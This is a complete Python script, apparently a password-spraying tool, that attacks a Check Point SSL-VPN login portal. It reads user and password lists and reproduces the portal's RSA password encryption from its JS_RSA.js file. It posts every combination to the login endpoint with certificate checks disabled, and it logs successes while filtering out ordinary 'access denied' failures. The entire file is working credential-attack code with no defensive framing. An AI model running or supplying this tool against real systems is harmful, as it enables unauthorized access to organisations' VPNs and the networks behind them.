#!/usr/bin/env python3
import argparse
import json
import re
import sys
import time
from pathlib import Path
from typing import Dict, List, Tuple

import requests
import urllib3
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA

# Headers captured from login.fetch
BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
}


def extract_rsa_components(js_path: Path) -> Tuple[str, str]:
    """
    Pull modulus and exponent hex strings from a JS_RSA.js body.
    Keeps the script free of embedded key material.
    """
    text = js_path.read_text(encoding="utf-8", errors="ignore")
    modulus_match = re.search(r"modulus\s*=\s*['\"]([0-9a-fA-F]+)['\"]", text)
    exponent_match = re.search(r"exponent\s*=\s*['\"]([0-9a-fA-F]+)['\"]", text)
    if not modulus_match or not exponent_match:
        raise ValueError(f"Could not locate modulus/exponent in {js_path}")
    return modulus_match.group(1), exponent_match.group(1)


def build_rsa_key(modulus_hex: str, exponent_hex: str) -> RSA.RsaKey:
    modulus = int(modulus_hex, 16)
    exponent = int(exponent_hex, 16)
    return RSA.construct((modulus, exponent))


def cp_encrypt(password: str, key: RSA.RsaKey) -> str:
    """
    Mirror window.cpRSAobj.encrypt():
    - UTF-8 encode the password
    - Append a terminating null byte
    - PKCS#1 v1.5 encrypt with random padding
    - Reverse hex byte pairs in the output
    """
    payload = password.encode("utf-8") + b"\x00"
    k = key.size_in_bytes()
    if len(payload) > k - 11:
        raise ValueError("Password too long for RSA block size")

    cipher = PKCS1_v1_5.new(key)
    ciphertext = cipher.encrypt(payload)
    return ciphertext[::-1].hex()


def load_list(path: str) -> List[str]:
    resolved = Path(path).expanduser()
    if not resolved.is_file():
        script_dir = Path(__file__).resolve().parent
        alt = script_dir / path
        if alt.is_file():
            resolved = alt
        else:
            raise FileNotFoundError(f"List file not found: {resolved} (also tried {alt})")

    with open(resolved, "r", encoding="utf-8") as handle:
        return [line.strip() for line in handle if line.strip()]


def parse_response(text: str, status_code: int) -> Dict:
    attributes: Dict[str, str] = {}
    success = False

    match = re.search(r"errorMessage[^>]*>(.*?)<", text, re.S | re.I)
    message = None
    if match:
        message = match.group(1).strip()
        attributes["message"] = re.sub(r"\s+", " ", message)
        dn_match = re.search(r"User DN\s*:?\s*([^<\n]+)", message, re.I)
        if dn_match:
            attributes["user_dn"] = dn_match.group(1).strip()
        unit_match = re.search(r"Account unit\s*:?\s*([^<\n]+)", message, re.I)
        if unit_match:
            attributes["account_unit"] = unit_match.group(1).strip()
    else:
        # Heuristic: if no explicit error message is rendered, treat as success.
        success = status_code < 400

    if message:
        success = False

    return {"success": success, "attributes": attributes}


def send_attempt(
    session: requests.Session,
    url: str,
    user: str,
    password: str,
    encrypted: str,
    timeout: float,
) -> Dict:
    data = [
        ("selectedRealm", "ssl_vpn"),
        ("loginType", "Standard"),
        ("userName", user),
        ("pin", ""),
        ("password", encrypted),
        ("HeightData", ""),
    ]

    start = time.time()
    response = session.post(url, headers=BASE_HEADERS, data=data, timeout=timeout)
    elapsed = time.time() - start
    if elapsed >= 15:
        sys.stderr.write("Target unresponsive (>=15s); aborting.\n")
        sys.exit(1)

    parsed = parse_response(response.text, response.status_code)
    parsed.update(
        {
            "user": user,
            "password": password,
            "encrypted": encrypted,
            "status_code": response.status_code,
        }
    )
    return parsed


def should_print_stdout(result: Dict) -> bool:
    """
    Decide whether to echo a result to stdout:
    - Always print successes
    - Print failures unless they are the standard access denied message
    """
    if result.get("success"):
        return True
    message = result.get("attributes", {}).get("message", "") or ""
    return "access denied - wrong user name or password" not in message.lower()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Replicate Check Point SSL-VPN login requests",
        add_help=False,
    )
    parser.add_argument("-h", "--host", required=True, help="Target host or IP")
    parser.add_argument("-p", "--passwords", required=True, help="Password list file")
    parser.add_argument("-u", "--users", required=True, help="User list file")
    parser.add_argument("-r", "--rate", type=float, default=0.2, help="Delay between attempts (seconds)")
    parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout (seconds)")
    parser.add_argument("-o", "--output", help="Append all JSON results to this file")
    parser.add_argument(
        "--rsa-file",
        default="JS_RSA.js",
        help="Path to the JS_RSA.js fetched from the target portal (used to extract modulus/exponent)",
    )
    parser.add_argument("--help", action="help", help="Show this help message and exit")
    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    users = load_list(args.users)
    passwords = load_list(args.passwords)

    rsa_path = Path(args.rsa_file).expanduser()
    if not rsa_path.is_file():
        alt = Path(__file__).resolve().parent / args.rsa_file
        if alt.is_file():
            rsa_path = alt
    if not rsa_path.is_file():
        sys.stderr.write("RSA file not found; fetch JS_RSA.js from the portal and point --rsa-file to it.\n")
        sys.exit(1)
    try:
        modulus_hex, exponent_hex = extract_rsa_components(rsa_path)
    except Exception as rsa_err:
        sys.stderr.write(f"Unable to load RSA parameters: {rsa_err}\n")
        sys.exit(1)

    target_url = f"https://{args.host}/sslvpn/Login/Login"
    rsa_key = build_rsa_key(modulus_hex, exponent_hex)

    session = requests.Session()
    session.verify = False

    total_attempts = len(users) * len(passwords)
    attempt_idx = 0
    outfile = open(args.output, "a", encoding="utf-8") if args.output else None

    try:
        for pwd in passwords:
            for user in users:
                attempt_idx += 1
                try:
                    encrypted = cp_encrypt(pwd, rsa_key)
                except Exception as enc_err:
                    result = {
                        "user": user,
                        "password": pwd,
                        "encrypted": "",
                        "success": False,
                        "status_code": None,
                        "attributes": {"error": f"encryption_failed: {enc_err}"},
                    }
                    json_line = json.dumps(result)
                    if outfile:
                        outfile.write(json_line + "\n")
                        outfile.flush()
                    if should_print_stdout(result):
                        print(json_line)
                    time.sleep(args.rate)
                    continue

                try:
                    result = send_attempt(session, target_url, user, pwd, encrypted, args.timeout)
                except Exception as req_err:
                    status_code = None
                    resp = getattr(req_err, "response", None)
                    if resp is not None:
                        status_code = getattr(resp, "status_code", None)
                    result = {
                        "user": user,
                        "password": pwd,
                        "encrypted": encrypted,
                        "success": False,
                        "status_code": status_code,
                        "attributes": {"error": f"request_failed: {req_err}"},
                    }

                json_line = json.dumps(result)
                if outfile:
                    outfile.write(json_line + "\n")
                    outfile.flush()
                if should_print_stdout(result):
                    print(json_line)

                status = "OK" if result.get("success") else "FAIL"
                sys.stderr.write(f"\r[{attempt_idx}/{total_attempts}] {user}: {status}")
                sys.stderr.flush()
                time.sleep(args.rate)
    finally:
        if outfile:
            outfile.close()
        sys.stderr.write("\n")


if __name__ == "__main__":
    main()
